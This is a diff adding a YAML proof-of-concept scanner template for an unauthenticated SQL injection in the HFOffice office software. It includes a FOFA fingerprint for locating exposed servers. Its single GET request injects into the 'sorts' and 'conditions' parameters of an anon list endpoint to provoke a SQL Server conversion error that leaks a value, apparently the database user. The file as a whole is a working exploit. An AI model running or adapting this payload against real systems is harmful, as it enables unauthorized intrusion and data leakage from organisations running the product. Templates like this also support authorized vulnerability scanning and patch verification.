@@ -1,0 +1,24 @@
+id: poc-yaml-hfoffice-anon-sqli
+info:
+  name: 红帆HFOffice anon SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: hfoffice
+  fofa: app="红帆-HFOffice"
+requests:
+- method: GET
+  path: /api/portal-public-link/anon/list?sorts=[{"Field":"SortID","SortBy":2},{"Field":'1',"SortBy":'1'}]&conditions=[{"Field":"IsEnable","DataType":1,"Option":1,"Value":'user'},{"Field":"Module","DataType":1,"Option":7,"Value":"1"}]
+  expression: 'status_code == 400 &&
+
+    contains(body,"在将 nvarchar 值") &&
+
+    contains(body,"转换成数据类型 bit 时失败") &&
+
+    matches(body,"''([0-9a-zA-Z]+)''") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
